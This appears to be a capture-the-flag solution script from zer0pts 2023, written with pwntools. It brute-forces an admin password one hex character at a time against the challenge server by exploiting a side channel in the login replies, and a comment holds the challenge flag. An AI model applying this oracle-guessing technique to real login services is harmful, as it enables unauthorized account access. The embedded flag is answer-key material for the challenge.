from pwn import *

# zer0pts{d0Nt_r3sp0nd_t00_qu1ck}
valid_chars = '0123456789abcdef'
def trial(attempt):
    p = remote('misc3.2023.zer0pts.com', 10021)
    p.sendlineafter(b'Username: ', b'admin')
    p.sendafter(b'Password: ', attempt.encode('ascii'))
    res = p.recvline(timeout=2)
    p.close()
    return res

def get_pw():
    pw = ''
    while True:
        for x in valid_chars:
            res = trial(pw + x)
            if len(res) == 0:
                pw += x
                break
            elif b'Logged in' in res:
                return pw
            # print(x, trial(x))
        print('==================================================')
        print(pw)
        print('==================================================')

print(get_pw())
